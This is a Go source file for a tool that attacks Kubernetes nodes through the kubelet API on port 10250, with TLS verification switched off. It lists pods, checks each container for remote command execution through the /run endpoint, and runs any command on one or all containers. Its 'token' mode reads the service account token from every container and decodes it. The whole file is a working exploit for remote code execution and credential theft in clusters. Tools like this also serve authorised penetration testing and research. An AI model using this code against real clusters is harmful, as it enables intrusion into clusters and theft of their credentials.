package main

import (
	"bytes"
	"crypto/tls"
	b64 "encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
	"time"
)

type MetaData struct {
	Name      string `json:"name"`
	Namespace string `json:"namespace"`
}

type Container struct {
	Name    string `json:"name"`
	RCEExec bool
	RCERun  bool
}

type Spec struct {
	Containers []Container `json:"containers"`
}

type Pod struct {
	MetaData MetaData `json:"metadata"`
	Spec     Spec     `json:"spec"`
}

type PodList struct {
	Items []Pod `json:"items"`
}

var GlobalClient *http.Client

func InitHttpClient() {
	tr := &http.Transport{
		MaxIdleConns:       10,
		IdleConnTimeout:    30 * time.Second,
		DisableCompression: true,
		TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
	}

	GlobalClient = &http.Client{
		Transport: tr,
		Timeout:   time.Second * 20,
	}
}

func getPods(url string) PodList {
	apiUrl := url + PODS_API
	resp, err := GetRequest(GlobalClient, apiUrl)
	if err != nil {
		fmt.Printf("[*] Failed to run HTTP request with error: %s\n", err)
		os.Exit(1)
	}

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	var podList PodList
	err = json.Unmarshal(bodyBytes, &podList)
	if err != nil {
		fmt.Printf("[*] JSON Unmarshal error: %s\n", err)
		os.Exit(1)
	}
	return podList
}

func getRawPods(url string) []byte {
	apiUrl := url + PODS_API
	resp, err := GetRequest(GlobalClient, apiUrl)
	if err != nil {
		fmt.Printf("[*] Failed to run HTTP request with error: %s\n", err)
		os.Exit(1)
	}

	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	return bodyBytes
}

const (
	PODS_API string = "/pods"
	RUN_API  string = "/run"
	EXEC_API string = "/exec"
)

func GetRequest(client *http.Client, url string) (*http.Response, error) {
	req, _ := http.NewRequest("GET", url, nil)

	//req.Header.Set("Authorization", "Bearer " + BEARER_TOKEN)
	resp, err := (*client).Do(req)
	return resp, err
}

func PostRequest(client *http.Client, url string, bodyData []byte) (*http.Response, error) {
	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(bodyData))
	//req.Header.Set("Authorization", "Bearer " + BEARER_TOKEN)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := (*client).Do(req)
	return resp, err
}

// colors: https://misc.flogisoft.com/bash/tip_colors_and_formatting
func printPods(podList []Pod) {
	//var sb strings.Builder
	count := 1
	baseSubIndexAlpha := 97 // base 'a'
	for _, pod := range podList {
		//podHeader := fmt.Sprintf("%d. Pod: %s \n   Namespace: %s\n   Containers:\n", count, pod.MetaData.Name, pod.MetaData.Namespace)
		//sb.WriteString(podHeader)
		fmt.Printf("%d. Pod: %s \n   Namespace: %s\n   Containers:\n", count, pod.MetaData.Name, pod.MetaData.Namespace)
		count += 1
		count2 := 0
		containers := pod.Spec.Containers
		for _, container := range containers {
			//containerStr := fmt.Sprintf("      %d. Container: %s\n", count2, container.Name)
			//sb.WriteString(containerStr)
			if container.RCERun {
				fmt.Printf("      %s. Container: %s (\u001B[1;34mRCE enabled\u001B[0m)\n", string(count2+baseSubIndexAlpha), container.Name)
			} else {
				fmt.Printf("      %s. Container: %s\n", string(count2+baseSubIndexAlpha), container.Name)
			}

			count2 += 1
		}
	}

	//fmt.Println(sb.String())
}

func checkPodsForRCE(nodeUrl string, pods []Pod) []Pod {
	command := "?cmd=ls"
	var nodePods []Pod

	for _, pod := range pods {
		var podContainers []Container
		containers := pod.Spec.Containers
		for _, container := range containers {
			containerRCERun := false
			apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s%s", nodeUrl, RUN_API, pod.MetaData.Namespace, pod.MetaData.Name, container.Name, command)
			resp, err := PostRequest(GlobalClient, apiPathUrl, []byte{})

			// TODO: check if this check is enough
			if err == nil && resp != nil && resp.StatusCode == http.StatusOK {
				containerRCERun = true
			}
			podContainers = append(podContainers, Container{
				Name:   container.Name,
				RCERun: containerRCERun,
			})
		}

		nodePods = append(nodePods, Pod{
			MetaData: MetaData{
				Name:      pod.MetaData.Name,
				Namespace: pod.MetaData.Namespace,
			},
			Spec: Spec{
				Containers: podContainers,
			},
		})
	}

	return nodePods
}

var globalProtocolSchema string
var globalNodeIP string
var globalKubeletPort string

func parseNodeURl(url string) {
	splitted := strings.Split(url, ":")
	globalProtocolSchema = splitted[0]
	globalNodeIP = strings.Replace(splitted[1], "/", "", 2)
	globalKubeletPort = splitted[2]
}

func findAndPrintContainerWithRCE(url string) {
	podList := getPods(url)
	containersWithRCE := checkPodsForRCE(url, podList.Items)
	printPods(containersWithRCE)
}

func findAndPrintPods(url string) {
	podList := getPods(url)
	printPods(podList.Items)
}

// credit: https://stackoverflow.com/a/46973603
func parseCommandLine(command string) ([]string, error) {
	var args []string
	state := "start"
	current := ""
	quote := "\""
	escapeNext := true
	for i := 0; i < len(command); i++ {
		c := command[i]

		if state == "quotes" {
			if string(c) != quote {
				current += string(c)
			} else {
				args = append(args, current)
				current = ""
				state = "start"
			}
			continue
		}

		if escapeNext {
			current += string(c)
			escapeNext = false
			continue
		}

		if c == '\\' {
			escapeNext = true
			continue
		}

		if c == '"' || c == '\'' {
			state = "quotes"
			quote = string(c)
			continue
		}

		if state == "arg" {
			if c == ' ' || c == '\t' {
				args = append(args, current)
				current = ""
				state = "start"
			} else {
				current += string(c)
			}
			continue
		}

		if c != ' ' && c != '\t' {
			state = "arg"
			current += string(c)
		}
	}

	if state == "quotes" {
		return []string{}, errors.New(fmt.Sprintf("Unclosed quote in command line: %s", command))
	}

	if current != "" {
		args = append(args, current)
	}

	return args, nil
}

const (
	GET_PODS           = "pods"
	GET_CONTAINERS_RCE = "rce"
	RUN_COMMAND        = "run"
	TOKEN_COMMAND      = "token"
)

func printHttpResponse(resp *http.Response, err error) {
	if resp != nil {

		bodyBytes, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}

		bodyString := string(bodyBytes)

		if resp.StatusCode == http.StatusOK {
			fmt.Println(bodyString)

		} else {
			fmt.Printf("[*] The reponse failed with status: %d\n", resp.StatusCode)
			fmt.Printf("[*] Message: %s\n", bodyString)
		}
	} else {
		fmt.Println("[*] Response is empty")
		if err != nil {
			log.Fatal(err)
		}
	}
}

func runCommandOnContainer(url string, runCommand string, podName string, containerName string, namespace string) {
	if runCommand == "" {
		fmt.Println("[*] No command was set, setting default command 'ls'")
		runCommand = "ls"
	}
	command := "?cmd=" + runCommand

	apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s%s", url, RUN_API, namespace, podName, containerName, command)
	resp, err := PostRequest(GlobalClient, apiPathUrl, []byte{})

	printHttpResponse(resp, err)
}

// Consider make it ASYNC
func runCommandOnAllContainers(url string, runCommand string) {
	if runCommand == "" {
		fmt.Println("[*] No command was set, setting default command 'ls'")
		runCommand = "ls"
	}
	command := "?cmd=" + runCommand

	podList := getPods(url)
	podNumber := 0
	spacesString := "   "
	for _, pod := range podList.Items {
		podNumber += 1

		for _, container := range pod.Spec.Containers {
			// If we have more than 1 digit, we need to add more spaces to straight the lines
			if podNumber > 9 {
				spacesString = "    "
			} else if podNumber > 99 {
				spacesString = "     "
			}

			apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s%s", url, RUN_API, pod.MetaData.Namespace, pod.MetaData.Name, container.Name, command)
			resp, err := PostRequest(GlobalClient, apiPathUrl, []byte{})
			var output string
			if err == nil && resp != nil {
				bodyBytes, err := ioutil.ReadAll(resp.Body)
				if err == nil {
					output = string(bodyBytes)
				}
			}

			var sb strings.Builder
			sb.WriteString(fmt.Sprintf("%d. Pod: %s\n", podNumber, pod.MetaData.Name))
			sb.WriteString(fmt.Sprintf("%sNamespace: %s\n", spacesString, pod.MetaData.Namespace))
			sb.WriteString(fmt.Sprintf("%sContainer: %s\n", spacesString, container.Name))
			sb.WriteString(fmt.Sprintf("%sUrl: %s\n", spacesString, apiPathUrl))
			sb.WriteString(fmt.Sprintf("%sOutput: \n%s\n\n", spacesString, output))
			fmt.Println(sb.String())
		}
	}
}

type RunOutput struct {
	Url           string
	PodName       string
	ContainerName string
	Namespace     string
	Output        string
	StatusCode    int
}

func runParallelCommandsOnPods(url string, runCommand string) {
	if runCommand == "" {
		fmt.Println("[*] No command was set, setting default command 'ls'")
		runCommand = "ls"
	}
	command := "?cmd=" + runCommand

	podList := getPods(url)
	concurrencyLimit := 5
	// this buffered channel will block at the concurrency limit
	semaphoreChan := make(chan struct{}, concurrencyLimit)

	// this channel will not block and collect the http request results
	resultsChan := make(chan *RunOutput)

	// make sure we close these channels when we're done with them
	defer func() {
		close(semaphoreChan)
		close(resultsChan)
	}()

	containersCounter := 0
	// keen an index and loop through every Url we will send a request to
	for i, pod := range podList.Items {
		for _, container := range pod.Spec.Containers {
			localI := i
			localPod := pod
			localContainer := container
			// start a go routine with the index and Url in a closure
			go func(i int, pod Pod, container Container) {

				// this sends an empty struct into the semaphoreChan which
				// is basically saying add one to the limit, but when the
				// limit has been reached block until there is room
				semaphoreChan <- struct{}{}

				apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s%s", url, RUN_API, pod.MetaData.Namespace, pod.MetaData.Name, container.Name, command)
				resp, err := PostRequest(GlobalClient, apiPathUrl, []byte{})
				statusCode := 0
				var output string
				if err == nil && resp != nil {
					statusCode = resp.StatusCode
					bodyBytes, err := ioutil.ReadAll(resp.Body)
					if err == nil {
						output = string(bodyBytes)
					}
				}

				result := &RunOutput{apiPathUrl, pod.MetaData.Name, container.Name, pod.MetaData.Namespace, output, statusCode}
				containersCounter += 1
				// now we can send the Result struct through the resultsChan
				resultsChan <- result
				// once we're done it's we read from the semaphoreChan which
				// has the effect of removing one from the limit and allowing
				// another goroutine to start
				<-semaphoreChan
			}(localI, localPod, localContainer)
		}
	}

	// start listening for any results over the resultsChan
	// once we get a Result append it to the Result slice
	podNumber := 1
	spacesString := "   "
	for {
		result := <-resultsChan

		// If we have more than 1 digit, we need to add more spaces to straight the lines
		if podNumber > 9 {
			spacesString = "    "
		} else if podNumber > 99 {
			spacesString = "     "
		}

		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("%d. Pod: %s\n", podNumber, result.PodName))
		sb.WriteString(fmt.Sprintf("%sNamespace: %s\n", spacesString, result.Namespace))
		sb.WriteString(fmt.Sprintf("%sContainer: %s\n", spacesString, result.ContainerName))
		sb.WriteString(fmt.Sprintf("%sUrl: %s\n", spacesString, result.Url))
		sb.WriteString(fmt.Sprintf("%sOutput: \n%s\n\n", spacesString, result.Output))
		fmt.Println(sb.String())

		podNumber += 1

		// if we've reached the expected amount of runPodsInfo then stop
		if podNumber == containersCounter {
			break
		}
	}
}

func scanForTokensFromAllPods(url string) {
	command := "?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token"

	podList := getPods(url)
	concurrencyLimit := 5

	// this buffered channel will block at the concurrency limit
	semaphoreChan := make(chan struct{}, concurrencyLimit)

	// this channel will not block and collect the http request results
	resultsChan := make(chan *RunOutput)

	// make sure we close these channels when we're done with them
	defer func() {
		close(semaphoreChan)
		close(resultsChan)
	}()

	containersCounter := 0
	// keen an index and loop through every Url we will send a request to
	for i, pod := range podList.Items {
		for _, container := range pod.Spec.Containers {
			localI := i
			localPod := pod
			localContainer := container
			// start a go routine with the index and Url in a closure
			go func(i int, pod Pod, container Container) {
				// this sends an empty struct into the semaphoreChan which
				// is basically saying add one to the limit, but when the
				// limit has been reached block until there is room
				semaphoreChan <- struct{}{}

				apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s%s", url, RUN_API, pod.MetaData.Namespace, pod.MetaData.Name, container.Name, command)
				resp, err := PostRequest(GlobalClient, apiPathUrl, []byte{})
				statusCode := 0
				var output string
				if err == nil && resp != nil {
					statusCode = resp.StatusCode
					bodyBytes, err := ioutil.ReadAll(resp.Body)
					if err == nil {
						output = string(bodyBytes)
					}
				}

				result := &RunOutput{apiPathUrl, pod.MetaData.Name, container.Name, pod.MetaData.Namespace, output, statusCode}
				containersCounter += 1
				// now we can send the Result struct through the resultsChan

				resultsChan <- result
				// once we're done it's we read from the semaphoreChan which
				// has the effect of removing one from the limit and allowing
				// another goroutine to start
				<-semaphoreChan
			}(localI, localPod, localContainer)
		}
	}

	// start listening for any results over the resultsChan
	// once we get a Result append it to the Result slice
	var count int
	podNumber := 1
	spacesString := "   "
	for {
		result := <-resultsChan
		count += 1
		time.Sleep(time.Millisecond * 500)
		// If we have more than 1 digit, we need to add more spaces to straight the lines
		if count > 9 {
			spacesString = "    "
		} else if count > 99 {
			spacesString = "     "
		}

		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("%d. Pod: %s\n", podNumber, result.PodName))
		sb.WriteString(fmt.Sprintf("%sNamespace: %s\n", spacesString, result.Namespace))
		sb.WriteString(fmt.Sprintf("%sContainer: %s\n", spacesString, result.ContainerName))
		sb.WriteString(fmt.Sprintf("%sUrl: %s\n", spacesString, result.Url))
		sb.WriteString(fmt.Sprintf("%sOutput: \n%s\n\n", spacesString, result.Output))
		fmt.Println(sb.String())

		if result.StatusCode == http.StatusOK {
			PrintDecodedToken(result.Output)
		}

		podNumber += 1

		// if we've reached the expected amount of runPodsInfo then stop
		if (podNumber - 1) == containersCounter {
			break
		}
	}

	time.Sleep(time.Second)
}

type JWTToken struct {
	Iss            string `json:"iss"`
	Namespace      string `json:"kubernetes.io/serviceaccount/namespace"`
	Secret         string `json:"kubernetes.io/serviceaccount/secret.name"`
	ServiceAccount string `json:"kubernetes.io/serviceaccount/service-account.name"`
	Uid            string `json:"kubernetes.io/serviceaccount/service-account.uid"`
	Sub            string `json:"sub"`
}

// Taken from kubetok
func PrintDecodedToken(tokenString string) {
	splittedToken := strings.Split(tokenString, ".")
	sDec, _ := b64.StdEncoding.DecodeString(splittedToken[1])
	newDec := string(sDec)
	newDec = strings.Replace(newDec, "\r\n", "\n", -1)
	if !strings.HasSuffix(newDec, "}") {
		newDec += "}"
	}

	var jwtToken JWTToken
	err := json.Unmarshal([]byte(newDec), &jwtToken)
	if err != nil {
		fmt.Printf("[*] Failed to print %s", err)
	} else {
		var sb strings.Builder
		sb.WriteString(fmt.Sprintln("---------------"))
		sb.WriteString(fmt.Sprintln("|Decoded Token|"))
		sb.WriteString(fmt.Sprintln("---------------"))
		sb.WriteString(fmt.Sprintf(" iss: %s\n", jwtToken.Iss))
		sb.WriteString(fmt.Sprintf(" Namespace: %s\n", jwtToken.Namespace))
		sb.WriteString(fmt.Sprintf(" Secret name: %s\n", jwtToken.Secret))
		sb.WriteString(fmt.Sprintf(" ServiceAccount: %s\n", jwtToken.ServiceAccount))
		sb.WriteString(fmt.Sprintf(" uid: %s\n", jwtToken.Uid))
		sb.WriteString(fmt.Sprintf(" sub: %s\n", jwtToken.Sub))
		sb.WriteString(fmt.Sprintf(" Raw: \n%s\n\n", newDec))
		fmt.Println(sb.String())
	}
}

func checkURL(url string) {
	log.Printf("URL: %s", url)
}

func mainfunc(url string, commandLine string) error {
	//func mainfunc(command string, ){
	//command := "rce"

	commandLine = strings.TrimSpace(commandLine)
	url = strings.TrimSpace(url)
	args, err := parseCommandLine(commandLine)

	if err != nil {
		return err
	}

	containerFlag := false
	podFlag := false
	namespaceFlag := false
	waitForRunCommand := false
	allPodsFlag := false
	allPodsAsyncFlag := false
	rawFlag := false
	var containerName string
	var podName string
	var namespace string
	var command string
	var runCommand string

	for i := 0; i < len(args); i++ {
		if strings.HasPrefix(args[i], "-c") {
			containerFlag = true
			continue
		} else if strings.HasPrefix(args[i], "-p") {
			podFlag = true
			continue
		} else if strings.HasPrefix(args[i], "-n") {
			namespaceFlag = true
			continue
		} else if strings.HasPrefix(args[i], "-a") {
			allPodsFlag = true
			continue
		} else if strings.HasPrefix(args[i], "-as") {
			allPodsAsyncFlag = true
			continue
		} else if strings.HasPrefix(args[i], "-r") {
			rawFlag = true
			continue
		} else {
			if containerFlag {
				containerName = args[i]
				containerFlag = false
			} else if podFlag {
				podName = args[i]
				podFlag = false
			} else if namespaceFlag {
				namespace = args[i]
				namespaceFlag = false
			} else { // without switches
				if waitForRunCommand {
					runCommand = args[i]
					waitForRunCommand = false
				} else {
					command = args[i]
					if command == RUN_COMMAND {
						waitForRunCommand = true
					}
				}
			}
		}
	}

	InitHttpClient()
	checkURL(url) // Here we check if the URL is OK

	//parseNodeURl(url)
	command = strings.ToLower(command)
	switch command {
	case GET_CONTAINERS_RCE:
		findAndPrintContainerWithRCE(url)
	case RUN_COMMAND:
		if namespace == "" {
			namespace = "default"
		}

		if allPodsFlag {
			fmt.Printf("[*] Run the command \"%s\" on all pods synchronously\n", runCommand)
			runCommandOnAllContainers(url, runCommand)
		} else if allPodsAsyncFlag {
			fmt.Printf("[*] Run the command \"%s\" on all pods asynchronously\n", runCommand)
			runParallelCommandsOnPods(url, runCommand)
		} else {
			fmt.Printf("[*] Run the command \"%s\" on pod: %s, container: %s, namespace: %s\n", runCommand)
			runCommandOnContainer(url, runCommand, podName, containerName, namespace)
		}
	case TOKEN_COMMAND:
		scanForTokensFromAllPods(url)
	default:
		if rawFlag {
			raw := getRawPods(url)
			fmt.Println(string(raw))
		} else {
			findAndPrintPods(url)
		}
	}

	return err
}

/*
func main(){
	//mainfunc("run \"whoami\" -n default -c alpine -p alpine")
	mainfunc("https://<node_ip>:10250", "run -a")
	//mainfunc("run -as")
	//mainfunc("https://<node_ip>:10250", "token")
	//mainfunc("rce")
	//mainfunc("https://<node_ip>:10250", " pods")
}

*/
